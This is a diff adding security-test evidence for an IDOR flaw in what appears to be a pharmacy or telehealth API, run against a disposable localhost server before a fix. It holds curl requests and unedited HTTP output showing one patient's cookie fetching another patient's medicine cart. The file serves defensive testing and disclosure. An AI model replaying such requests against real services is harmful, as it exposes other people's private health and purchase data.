@@ -1,0 +1,48 @@
+V-13 IDOR: one patient can read another patient's cart
+======================================================
+
+state    : BEFORE the fix
+captured : 2026-09-24T17:36:49Z
+branch   : test/it22083500/v11-v15-before-evidence
+commit   : ec2853c
+tool     : curl 8.15.0  (real curl, output unedited)
+target   : http://localhost:4000  (disposable in-memory database, localhost only)
+
+Variables used below (values come from security-tests/.tokens.json):
+  DANA=patientToken=<dana's JWT>    DANA_ID=6ab55fac2afa3227fe052584
+  BOBBY=patientToken=<bobby's JWT>  BOBBY_ID=6ab55fac2afa3227fe052580
+  ALPHA=doctorToken=<Dr Alpha's JWT>  ALPHA_ID=6ab55fad2afa3227fe052588   (Dr Beta's id: 6ab55fad2afa3227fe05258b)
+  MED1=6ab55fad2afa3227fe05258e  MED2=6ab55fad2afa3227fe05258f  CART_ID=6ab55fad2afa3227fe052783  APPT_ID=6ab55fad2afa3227fe052785
+
+------------------------------------------------------------------------------
+CONTROL — Dana reads her own cart
+$ curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$DANA_ID" -H "Cookie: $DANA"
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 311
+ETag: W/"137-BzatCTWTJ4rHg6ykTrGn1EVjZAI"
+Date: Thu, 24 Sep 2026 17:36:50 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":200,"data":[{"_id":"6ab55fb12afa3227fe05278d","userId":"6ab55fac2afa3227fe052584","medicineId":"6ab55fad2afa3227fe05258e","quantity":99,"totalPrice":1,"status":"Pending","createdAt":"2026-09-24T17:36:49.817Z","updatedAt":"2026-09-24T17:36:49.817Z","__v":0}],"message":"Cart Fetched Successfully!"}
+
+ATTACK — Dana, with her own cookie, asks for Bobby's cart
+$ curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID" -H "Cookie: $DANA"
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 313
+ETag: W/"139-WcvWhrvNqXTiovrefQmCuYffZgY"
+Date: Thu, 24 Sep 2026 17:36:50 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":200,"data":[{"_id":"6ab55fad2afa3227fe052783","userId":"6ab55fac2afa3227fe052580","medicineId":"6ab55fad2afa3227fe05258e","quantity":3,"totalPrice":4500,"status":"Pending","createdAt":"2026-09-24T17:36:45.445Z","updatedAt":"2026-09-24T17:36:45.445Z","__v":0}],"message":"Cart Fetched Successfully!"}
+
+Every row returned in the attack has "userId":"6ab55fac2afa3227fe052580" — Bobby's data, sent to Dana.
